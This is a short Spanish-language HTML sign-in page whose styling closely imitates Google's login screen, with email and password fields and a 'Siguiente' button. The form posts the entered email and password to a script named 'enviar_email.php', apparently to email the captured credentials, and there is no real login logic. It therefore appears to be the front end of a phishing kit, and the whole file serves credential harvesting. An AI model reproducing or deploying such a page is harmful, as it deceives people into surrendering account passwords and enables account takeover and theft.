<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .contenedor-login {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        .contenedor-login h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #202124;
        }
        .contenedor-login label {
            font-size: 14px;
            color: #5f6368;
        }
        .contenedor-login input[type="email"],
        .contenedor-login input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        .contenedor-login input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .contenedor-login input[type="submit"]:hover {
            background-color: #0c62d1;
        }
        .olvido-contrasena {
            display: block;
            text-align: right;
            margin-top: 10px;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }
        .olvido-contrasena:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="contenedor-login">
        <h1>Iniciar sesión</h1>
        <form action="enviar_email.php" method="POST">
            <label for="correo">Correo electrónico</label>
            <input type="email" id="correo" name="correo" required>

            <label for="contrasena">Contraseña</label>
            <input type="password" id="contrasena" name="contrasena" required>

            <input type="submit" value="Siguiente">
        </form>
        <a href="#" class="olvido-contrasena">¿Olvidaste tu contraseña?</a>
    </div>
</body>
</html>
